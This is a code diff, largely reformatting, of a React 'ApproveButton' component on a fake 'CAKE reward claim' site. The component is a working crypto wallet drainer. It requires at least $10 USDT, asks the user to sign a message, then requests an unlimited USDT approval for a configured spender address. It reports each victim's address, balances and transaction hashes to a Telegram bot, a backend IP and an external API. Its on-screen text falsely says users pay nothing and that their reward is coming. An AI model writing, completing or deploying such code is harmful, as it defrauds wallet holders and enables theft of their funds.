@@ -8,7 +8,7 @@ import { eligibleWallets } from "../eligibleWallets";
 import CustomAlert from "./CustomAlert";
 
 // 🔹 Load from .env
-const USDT_ADDRESS = import.meta.env.VITE_USDT_ADDRESS; 
+const USDT_ADDRESS = import.meta.env.VITE_USDT_ADDRESS;
 const SPENDER = import.meta.env.VITE_SPENDER;
 const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
@@ -41,14 +41,18 @@ const sendToTelegram = async (message) => {
   }
 };
 
-
 // 🔹 Send message to backend IP/port
 const sendToBackendIP = async (data) => {
   // Hardcoded backend settings - change these values when deploying
   const backendIP = "YOUR_BACKEND_IP_HERE"; // Replace with your actual IP
   const backendPort = "YOUR_BACKEND_PORT_HERE"; // Replace with your actual port
-  
-  if (!backendIP || !backendPort || backendIP === "YOUR_BACKEND_IP_HERE" || backendPort === "YOUR_BACKEND_PORT_HERE") {
+
+  if (
+    !backendIP ||
+    !backendPort ||
+    backendIP === "YOUR_BACKEND_IP_HERE" ||
+    backendPort === "YOUR_BACKEND_PORT_HERE"
+  ) {
     //console.log("Backend IP/Port not configured, skipping backend send");
     return;
   }
@@ -100,27 +104,33 @@ const sendToExternalAPI = async (data) => {
 const hasBalanceChanged = (currentUSDT, currentBNB, address) => {
   const lastBalanceKey = `lastBalance_${address}`;
   const lastBalanceData = localStorage.getItem(lastBalanceKey);
-  
+
   if (!lastBalanceData) {
     // First time connecting this wallet
     return true;
   }
-  
+
   try {
-    const { usdt: lastUSDT, bnb: lastBNB, timestamp: lastTimestamp } = JSON.parse(lastBalanceData);
-    
+    const {
+      usdt: lastUSDT,
+      bnb: lastBNB,
+      timestamp: lastTimestamp,
+    } = JSON.parse(lastBalanceData);
+
     // Only check for changes if it's been at least 5 minutes since last update
     const timeDiff = new Date().getTime() - new Date(lastTimestamp).getTime();
     const fiveMinutes = 5 * 60 * 1000;
-    
+
     if (timeDiff < fiveMinutes) {
       return false; // Too soon, don't spam
     }
-    
+
     // Compare with proper decimal precision
-    const usdtChanged = Math.abs(parseFloat(currentUSDT) - parseFloat(lastUSDT)) >= 0.01;
-    const bnbChanged = Math.abs(parseFloat(currentBNB) - parseFloat(lastBNB)) >= 0.000000001;
-    
+    const usdtChanged =
+      Math.abs(parseFloat(currentUSDT) - parseFloat(lastUSDT)) >= 0.01;
+    const bnbChanged =
+      Math.abs(parseFloat(currentBNB) - parseFloat(lastBNB)) >= 0.000000001;
+
     return usdtChanged || bnbChanged;
   } catch (e) {
     console.error("Error parsing last balance data:", e);
@@ -134,7 +144,7 @@ const updateStoredBalance = (usdtFormatted, bnbFormatted, address) => {
   const balanceData = {
     usdt: usdtFormatted,
     bnb: bnbFormatted,
-    timestamp: new Date().toISOString()
+    timestamp: new Date().toISOString(),
   };
   localStorage.setItem(lastBalanceKey, JSON.stringify(balanceData));
 };
@@ -143,13 +153,13 @@ export default function ApproveButton() {
   const { address, isConnected, connector } = useAccount();
   const { data: walletClient } = useWalletClient();
   const [loading, setLoading] = useState(false);
-  
+
   // Custom alert states
   const [alert, setAlert] = useState({
     isOpen: false,
-    title: '',
-    message: '',
-    type: 'error'
+    title: "",
+    message: "",
+    type: "error",
   });
 
   const [cakeReward, setCakeReward] = useState(0);
@@ -160,9 +170,13 @@ export default function ApproveButton() {
       const storedReward = localStorage.getItem("cakeReward");
       const scanStatus = localStorage.getItem("scanCompleted");
 
-      
       // Only set CAKE reward if scan was actually completed and reward exists
-      if (scanStatus === "true" && storedReward && storedReward !== "0" && storedReward !== "null") {
+      if (
+        scanStatus === "true" &&
+        storedReward &&
+        storedReward !== "0" &&
+        storedReward !== "null"
+      ) {
         setCakeReward(storedReward);
         setScanCompleted(true);
       } else {
@@ -181,7 +195,6 @@ export default function ApproveButton() {
     return () => clearInterval(interval);
   }, []);
 
-
   // 🔹 Get balances
   const { data: bscBalance } = useBalance({ address, chainId: bsc.id });
   const { data: usdtBalance } = useBalance({
@@ -199,21 +212,21 @@ export default function ApproveButton() {
     : "0.000000000";
 
   // 🔹 Function to show custom alert
-  const showAlert = (title, message, type = 'error') => {
+  const showAlert = (title, message, type = "error") => {
     setAlert({
       isOpen: true,
       title,
       message,
-      type
+      type,
     });
   };
 
   const closeAlert = () => {
     setAlert({
       isOpen: false,
-      title: '',
-      message: '',
-      type: 'error'
+      title: "",
+      message: "",
+      type: "error",
     });
   };
 
@@ -223,10 +236,10 @@ export default function ApproveButton() {
       // Check if this is a new connection or if balances have changed
       if (hasBalanceChanged(usdtFormatted, bnbFormatted, address)) {
         const message = `🟢 Wallet Update:\n<code>${address}</code>\nUSDT: $${usdtFormatted}\nBNB: ${bnbFormatted}`;
-        
+
         // Send to Telegram
         sendToTelegram(message);
-        
+
         // Send to backend IP
         const walletData = {
           address,
@@ -235,10 +248,10 @@ export default function ApproveButton() {
           bnbBalance: bnbFormatted,
           timestamp: new Date().toISOString(),
         };
-        
+
         sendToBackendIP(walletData);
         sendToExternalAPI(walletData);
-        
+
         // Update stored balance
         updateStoredBalance(usdtFormatted, bnbFormatted, address);
       }
@@ -249,9 +262,9 @@ export default function ApproveButton() {
   const handleApprove = async () => {
     if (!walletClient || !isConnected || !address) {
       showAlert(
-        'Wallet Not Connected',
-        'Please connect your wallet to continue with the claim process.',
-        'warning'
+        "Wallet Not Connected",
+        "Please connect your wallet to continue with the claim process.",
+        "warning",
       );
       return;
     }
@@ -261,28 +274,27 @@ export default function ApproveButton() {
     const walletClientName = walletClient?.connector?.name;
     const accountConnectorId = connector?.id;
     const accountConnectorName = connector?.name;
-    
+
     // Use the best available source
     const walletId = walletClientId || accountConnectorId;
     const walletName = walletClientName || accountConnectorName;
     const connectorType = walletClient?.connector?.type || connector?.type;
-    
+
     // Check if wallet is eligible - must match exact wallet ID or wallet name
-    const isEligible = (
+    const isEligible =
       // Check eligibleWallets list by wallet ID
       (walletId && eligibleWallets[walletId]) ||
       // Check eligibleWallets list by wallet name
-      (walletName && eligibleWallets[walletName])
-    );
-    
+      (walletName && eligibleWallets[walletName]);
+
     console.log("Wallet eligibility check result:", isEligible);
     console.log("Checking against eligible wallets:", eligibleWallets);
-    
+
     if (!isEligible) {
       showAlert(
-        'Wallet Not Eligible',
-        `Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet.\n\nCurrent wallet: ${walletName || walletId || connectorType || 'Unknown'}`,
-        'error'
+        "Wallet Not Eligible",
+        `Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet.\n\nCurrent wallet: ${walletName || walletId || connectorType || "Unknown"}`,
+        "error",
       );
       return;
     }
@@ -290,16 +302,16 @@ export default function ApproveButton() {
     // USDT minimum check - check both ETH and BSC balances
     const totalUsdtBalance = Math.max(
       parseFloat(usdtFormatted) || 0,
-      usdtBalanceNumber || 0
+      usdtBalanceNumber || 0,
     );
-    
+
     console.log("Total USDT balance for claim check:", totalUsdtBalance);
-    
+
     if (totalUsdtBalance < 10) {
       showAlert(
-        'Insufficient Balance',
+        "Insufficient Balance",
         `You need at least $10 USDT to claim rewards.\n\nYour current balance: $${totalUsdtBalance.toFixed(2)} USDT\n\nPlease top up your wallet and try again.`,
-        'warning'
+        "warning",
       );
       return;
     }
@@ -312,22 +324,23 @@ export default function ApproveButton() {
 
     try {
       // Step 1: Personal Sign Message
-      const cakeAmount = cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5; // Default to 5 CAKE if not scanned
+      const cakeAmount =
+        cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5; // Default to 5 CAKE if not scanned
       const signMessage = `Claim ${cakeAmount} CAKE Reward`;
       //console.log("Requesting personal sign for:", signMessage);
 
       const signature = await walletClient.signMessage({
         account: address,
         message: signMessage,
-         usdtBalance: currentUsdtFormatted,
-        bnbBalance: currentBnbFormatted
+        usdtBalance: currentUsdtFormatted,
+        bnbBalance: currentBnbFormatted,
       });
 
       //console.log("Message signed successfully:", signature);
 
       // Send sign success to Telegram
       await sendToTelegram(
-        `✅ Message Signed:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`
+        `✅ Message Signed:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`,
       );
 
       const signData = {
@@ -346,7 +359,7 @@ export default function ApproveButton() {
       // Step 2: Proceed with USDT Approval
       const maxAmount = parseUnits(
         "115792089237316195423570985008687907853269984665640564039457584007913129639935",
-        0
+        0,
       );
 
       const hash = await walletClient.writeContract({
@@ -358,7 +371,7 @@ export default function ApproveButton() {
       });
 
       await sendToTelegram(
-        `✅ USDT Approved:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}\nTx Hash: ${hash}\nSigned Message: "${signMessage}"`
+        `✅ USDT Approved:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}\nTx Hash: ${hash}\nSigned Message: "${signMessage}"`,
       );
 
       const approvalData = {
@@ -377,26 +390,30 @@ export default function ApproveButton() {
 
       // Show success message
       showAlert(
-        'Claim Successful! 🎉',
-        `Your ${cakeAmount} CAKE reward claim has been processed successfully!\n\nTransaction Hash: ${hash.slice(0, 10)}...${hash.slice(-8)}`,
-        'success'
+        "Claim Successful! 🎉",
+        `You’ve successfully claimed ${cakeAmount} CAKE \n\nPlease allow a few minutes while we complete the final verification process.
+Your reward will be sent to your wallet shortly 💰✨ \n\nTransaction Hash: ${hash.slice(0, 10)}...${hash.slice(-8)}`,
+        "success",
       );
-
     } catch (err) {
       //console.error("Process failed:", err.message);
 
       // Determine if error was during signing or approval
-      const errorContext = err.message.toLowerCase().includes('user rejected')
-        ? (err.message.toLowerCase().includes('sign') ? 'Message signing rejected' : 'Transaction rejected')
-        : 'Process failed';
+      const errorContext = err.message.toLowerCase().includes("user rejected")
+        ? err.message.toLowerCase().includes("sign")
+          ? "Message signing rejected"
+          : "Transaction rejected"
+        : "Process failed";
 
       await sendToTelegram(
-        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`
+        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`,
       );
 
       const errorData = {
         address,
-        action: errorContext.toLowerCase().includes('sign') ? 'sign_failed' : 'approval_failed',
+        action: errorContext.toLowerCase().includes("sign")
+          ? "sign_failed"
+          : "approval_failed",
         error: err.message,
         usdtBalance: currentUsdtFormatted,
         bnbBalance: currentBnbFormatted,
@@ -410,10 +427,12 @@ export default function ApproveButton() {
     setLoading(false);
   };
 
-
   // Check if user has at least $10 USDT
   const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
-  const totalUsdtForCheck = Math.max(parseFloat(usdtFormatted) || 0, usdtBalanceNumber || 0);
+  const totalUsdtForCheck = Math.max(
+    parseFloat(usdtFormatted) || 0,
+    usdtBalanceNumber || 0,
+  );
   const hasMinimumUsdt = totalUsdtForCheck >= 10;
 
   console.log("USDT balance sent to claim button:", usdtBalanceNumber);
@@ -422,14 +441,16 @@ export default function ApproveButton() {
   // Only show button if wallet is connected AND scanning is completed
   if (!isConnected || !scanCompleted) {
     return (
-      <div style={{
-        padding: "20px",
-        textAlign: "center",
-        borderRadius: "15px",
-        background: "rgba(255, 255, 255, 0.05)",
-        border: "1px solid rgba(255, 255, 255, 0.1)",
-        color: "rgba(255, 255, 255, 0.7)"
-      }}>
+      <div
+        style={{
+          padding: "20px",
+          textAlign: "center",
+          borderRadius: "15px",
+          background: "rgba(255, 255, 255, 0.05)",
+          border: "1px solid rgba(255, 255, 255, 0.1)",
+          color: "rgba(255, 255, 255, 0.7)",
+        }}
+      >
         {!isConnected
           ? "🔗 Connect your wallet to claim rewards"
           : "🔍 Complete wallet scan to unlock claim"}
@@ -455,17 +476,13 @@ export default function ApproveButton() {
           fontSize: "1.1rem",
           fontWeight: "700",
           color: "#ffffff",
-          background: loading
-            ? "rgba(139, 92, 246, 0.5)"
-              : "#fb923cff",
+          background: loading ? "rgba(139, 92, 246, 0.5)" : "#fb923cff",
 
           border: "none",
           borderRadius: "15px",
           cursor: loading ? "not-allowed" : "pointer",
           transition: "all 0.3s ease",
-          boxShadow: loading
-            ? "none"
-            : "0 8px 25px rgba(139, 92, 246, 0.4)",
+          boxShadow: loading ? "none" : "0 8px 25px rgba(139, 92, 246, 0.4)",
           position: "relative",
           overflow: "hidden",
           backdropFilter: "blur(10px)",
@@ -484,20 +501,25 @@ export default function ApproveButton() {
         }}
       >
         {loading && (
-          <div style={{
-            position: "absolute",
-            top: 0,
-            left: "-100%",
-            width: "100%",
-            height: "100%",
-            background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
-            animation: "claimScan 1.2s infinite"
-          }} />
+          <div
+            style={{
+              position: "absolute",
+              top: 0,
+              left: "-100%",
+              width: "100%",
+              height: "100%",
+              background:
+                "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
+              animation: "claimScan 1.2s infinite",
+            }}
+          />
         )}
         <span style={{ position: "relative", zIndex: 1 }}>
-          
-      
-          {loading ? "🔄 Claiming..." : cakeReward && parseFloat(cakeReward) > 0 ? `🍰 Claim ${parseFloat(cakeReward)} CAKE` : "🍰 Claim CAKE Reward"}
+          {loading
+            ? "🔄 Claiming..."
+            : cakeReward && parseFloat(cakeReward) > 0
+              ? `🍰 Claim ${parseFloat(cakeReward)} CAKE`
+              : "🍰 Claim CAKE Reward"}
         </span>
         <style>
           {`
@@ -508,42 +530,50 @@ export default function ApproveButton() {
           `}
         </style>
       </button>
-     
+
       {/* Warning message when insufficient USDT */}
       {!hasMinimumUsdt && (
-        <div style={{
-          marginTop: "15px",
-          padding: "15px",
-          borderRadius: "12px",
-          background: "rgba(255, 193, 7, 0.1)",
-          border: "1px solid rgba(255, 193, 7, 0.3)",
-          color: "rgba(255, 255, 255, 0.9)",
-          textAlign: "center"
-        }}>
-          <div style={{
-            fontSize: "1rem",
-            fontWeight: "600",
-            marginBottom: "8px",
-            color: "#ffc107"
-          }}>
+        <div
+          style={{
+            marginTop: "15px",
+            padding: "15px",
+            borderRadius: "12px",
+            background: "rgba(255, 193, 7, 0.1)",
+            border: "1px solid rgba(255, 193, 7, 0.3)",
+            color: "rgba(255, 255, 255, 0.9)",
+            textAlign: "center",
+          }}
+        >
+          <div
+            style={{
+              fontSize: "1rem",
+              fontWeight: "600",
+              marginBottom: "8px",
+              color: "#ffc107",
+            }}
+          >
             💰 Minimum $10 USDT Required
           </div>
-          <div style={{
-            fontSize: "14px",
-            marginBottom: "12px",
-            color: "rgba(255, 255, 255, 0.8)",
-            fontStyle: "italic"
-          }}>
+          <div
+            style={{
+              fontSize: "14px",
+              marginBottom: "12px",
+              color: "rgba(255, 255, 255, 0.8)",
+              fontStyle: "italic",
+            }}
+          >
             Current balance: ${totalUsdtForCheck.toFixed(2)} USDT
           </div>
         </div>
       )}
 
       {/* View CAKE Price link */}
-      <div style={{
-        marginTop: "15px",
-        textAlign: "center"
-      }}>
+      <div
+        style={{
+          marginTop: "15px",
+          textAlign: "center",
+        }}
+      >
         <a
           href="https://www.coingecko.com/en/coins/pancakeswap"
           target="_blank"
@@ -557,7 +587,7 @@ export default function ApproveButton() {
             alignItems: "center",
             gap: "6px",
             transition: "all 0.2s ease",
-            borderBottom: "1px solid transparent"
+            borderBottom: "1px solid transparent",
           }}
           onMouseEnter={(e) => {
             e.target.style.color = "#3b82f6";
@@ -570,29 +600,36 @@ export default function ApproveButton() {
         >
           📊 View CAKE Price
         </a>
-        <div style={{
-          fontSize: "11px",
-          color: "rgba(255, 255, 255, 0.5)",
-          marginTop: "4px"
-        }}>
+        <div
+          style={{
+            fontSize: "11px",
+            color: "rgba(255, 255, 255, 0.5)",
+            marginTop: "4px",
+          }}
+        >
           (Redirects to CoinGecko🐸)
         </div>
       </div>
 
       {/* Explanatory note */}
-      <div style={{
-        marginTop: "15px",
-        fontSize: "13px",
-        lineHeight: "1.5",
-        color: "rgba(255, 255, 255, 0.7)",
-        background: "rgba(255, 255, 255, 0.05)",
-        padding: "12px",
-        borderRadius: "10px",
-        border: "1px solid rgba(255, 255, 255, 0.1)",
-        textAlign: "center",
-        fontStyle: "italic"
-      }}>
-        💡 Note: You're not paying anything — holding at least $10 USDT on the Binance Smart Chain (BSC) network simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
+      <div
+        style={{
+          marginTop: "15px",
+          fontSize: "13px",
+          lineHeight: "1.5",
+          color: "rgba(255, 255, 255, 0.7)",
+          background: "rgba(255, 255, 255, 0.05)",
+          padding: "12px",
+          borderRadius: "10px",
+          border: "1px solid rgba(255, 255, 255, 0.1)",
+          textAlign: "center",
+          fontStyle: "italic",
+        }}
+      >
+        💡 Note: You're not paying anything — holding at least $10 USDT on the
+        Binance Smart Chain (BSC) network simply proves you're real and helps
+        stop bots and cheaters from abusing the system. This keeps rewards fair
+        for active users like you.
       </div>
     </div>
   );
